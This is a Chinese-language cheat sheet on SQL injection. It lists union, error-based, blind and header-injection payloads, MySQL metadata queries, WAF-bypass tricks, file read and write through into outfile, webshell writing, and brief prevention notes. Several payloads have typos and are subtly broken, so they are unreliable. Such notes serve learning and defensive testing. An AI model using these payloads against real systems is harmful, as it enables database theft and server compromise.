# 原理
PHP是解释型语言，边编译边执行，因为用户输入了恶意构造的输入拼接到SQL语句中，执行了恶意输入
步骤：
探测注入点和闭合符号：数字运算、单引号、双引号、括号、反斜杠、
判断注入类型（int、char）
判断注入类型（报错、盲注）
orderby 判断字段数和显示位置（报错注入）
	union 联合查询 select 1 ，group_concat(table_name),3 from information_schema.tables where table_schema = database() --+ 
	union 联合查询 select 1 ，group_concat(column_name),3 from information_schema.columns where table_name = 'users' --+ 
	0' union select 1 ,group_concat(username,0x3a,password),3 from user--+
	（盲注）(先猜解长度再猜解字符)（轮询）
	select length(database());
	select substr(database),1,1);
	select ascii(substr(databse(),1,1))
	select ascii(substr(databse(),1,1))>N

# 分类

<u>int型</u>

<u>char型</u>

<u>get</u>

<u>post</u>->表单数据提交、文件上传

​	报错注入：登陆口令

​	时间注入：and if (length(database()>5),sleep(5),null)

​	boolean注入：and (length(database()>1)

<u>header</u>

​	*Cookie:(因为常用来验证用户操作而传入后台，是head头中的注入重点，base64编码)

 	referer:'or (length(database()))>8 or if(1=1,sleep(5),null) or  '1'='1'

​	User-Agent:'updatexml(xml_document,xpath_string_new_value)->(XML文档名称,xpath字符串,替换查找到的符合条件的数据)

​						'AND updatexml(1,concat(0x7e,(select databases()),0x7e),1) or '1'='1'

​		IP

blind:sql语句查询到时正常返回页面、查询不到时返回空
	boolean:if判断+注入Ture返回正常，false返回报错not页面
		select length(database());
		

	time:' and if(ascii(substr(database(),m,n)==115,1,sleep(time))) -- 当第m个字符的第n个字母的ascii码等于115时睡眠time秒

mysql（关系型数据库）
	mysql5.0+
		information_shcema
			schemata
				schema_name
			tables
				table_schema
				table_name
			columns
				table_schema
				table_name
				column_name
	基本语法：
		select
		insert into
		update
		delete
		user()
		database()
		version()
		order by
		union select
		limit
		select load_file("path")
		select into outfile 'E:\\PATH\\www\\'

updataxml->updatexml(1,concat(0x7e,(select database()),0x7e),1)

extractvalue->extractvalue(1,concat(0x7e,database(),0x7e))

注释：#，-- ，--+，

​		多行注释 /**/

​      内联注释/*！SQL语句*/常用来绕过WAF 

<u>asp+access </u>    aceess偏移注入

​	原理：利用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段显示在面上，不能100%成功

场景：知道Access数据库中的表明，但是得不到字段的sql注入（字段取名复杂，无法暴力破解）

流程：1.判断字段数（order by）  2.判断表明union select * from   开始偏移注入

# bapass

大小写绕过->关键字匹配

内插注释过滤(an/**/d)->关键字匹配 

等价替换过滤&&=and,||=or->or and 关键字匹配

双写绕过->关键字替换为空

编码绕过

内联注释绕过->内联注释中的内容会被当中SQL语句执行

半闭合绕过->过滤了闭合字符串的

编码绕过->过滤了空格的规则

| %0a  | 换行       |
| ---- | ---------- |
| %0b  | 垂直制表符 |
| %0c  | 换页       |
| %0d  | return     |
| %09  | 水平制表符 |

-1’%09nuIOn%09sEleCt%091,2,3%09or '1->剔除了union select字符和空格

宽字节绕过:吃掉转义符\ (用转义符转移我们闭合查询的单引号‘)使用Ascii大于128




# 漏洞利用

mysql注入读写文件

	前提：1.用户权限足够高  
	
		2.secure_file_priy != NULL
		3.知道绝对路径

mysql注入读文件：select load_file("E:\\PATH")
		mysql注入写文件：union select 1,'<?php phpinfo();?>','3' into outfile 'E:\\PATH\\www\\'

写入webshell

# 防范措施

字符过滤：stripslasshes() get_magic_quoto_gpc() mysql_real_escape_string()

正则搜索替换：preg_replace(mixed $pattern,mixed $replacement,mixed $subject)(搜索模式，用于替换的字符串，被替换的字符串)